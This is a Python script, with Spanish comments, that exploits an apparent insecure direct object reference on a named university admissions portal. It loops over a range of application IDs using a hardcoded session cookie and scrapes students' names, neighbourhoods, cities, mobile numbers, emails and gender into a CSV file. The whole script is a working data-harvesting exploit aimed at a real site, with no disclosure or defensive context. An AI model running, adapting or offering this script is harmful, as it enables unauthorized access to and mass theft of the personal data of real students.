import requests
from bs4 import BeautifulSoup
import csv

# --- CONFIGURACIÓN ---
# Reemplaza esto con tu cookie de sesión actual
cookie = {'JSESSIONID': 'AA25A3C1A9F24705A8EFCF174D6B3AFE'}

# Rango de IDs a probar (ajusta según lo que encontraste en Burp)
rango_ids = range(10000, 11001)

# Archivo de salida
archivo_csv = 'datos_alumnos.csv'
# --------------------

# Abre el archivo CSV para escribir los datos
with open(archivo_csv, 'w', newline='', encoding='utf-8') as f:
    writer = csv.writer(f)
    
    # Escribe la fila de encabezado
    writer.writerow(['ID_Solicitud', 'Ficha', 'Nombre', 'Colonia', 'Ciudad', 'Carrera', 'Celular', 'Email', 'Genero'])

    print(f"[*] Iniciando extracción de IDs en el rango {rango_ids.start}-{rango_ids.stop-1}...")

    # Itera sobre cada ID en el rango
    for solicitud_id in rango_ids:
        # Construye la URL para cada ID
        target_url = f"https://sito.utslp.edu.mx/jsp/escolar/proceso_admision/../inscripcion/proceso_formato_encuesta_expectativa_esc.jsp?xDatIntC=9605&xDatSolC={solicitud_id}&xModalidadP=N"
        
        try:
            # Realiza la petición GET con la cookie de sesión
            response = requests.get(target_url, cookies=cookie, verify=False)
            
            # Procesa solo si la petición fue exitosa (código 200)
            if response.status_code == 200:
                # Parsea el contenido HTML
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Busca la tabla que contiene los datos personales
                tabla_datos = soup.find('table', class_='TablaFinaDerechaSuperior')
                
                if tabla_datos:
                    celdas = tabla_datos.find_all('td', class_='rCelda')
                    
                    # Extrae los datos basándose en su posición en la tabla
                    ficha = celdas[0].get_text(strip=True)
                    nombre = celdas[1].get_text(strip=True)
                    colonia = celdas[2].get_text(strip=True)
                    ciudad = celdas[3].get_text(strip=True)
                    carrera = celdas[4].get_text(strip=True)
                    celular = celdas[5].get_text(strip=True)
                    email = celdas[6].get_text(strip=True)
                    genero = celdas[7].get_text(strip=True)
                    
                    # Escribe los datos extraídos en el archivo CSV
                    writer.writerow([solicitud_id, ficha, nombre, colonia, ciudad, carrera, celular, email, genero])
                    print(f"[+] ¡Éxito! Datos extraídos para el ID: {solicitud_id} - Nombre: {nombre}")
                else:
                    print(f"[-] El ID {solicitud_id} no devolvió la tabla de datos esperada.")
            else:
                print(f"[-] Fallo al obtener el ID {solicitud_id} - Status: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Error de conexión para el ID {solicitud_id}: {e}")

print(f"\n[*] Extracción completada. Los datos han sido guardados en '{archivo_csv}'.")
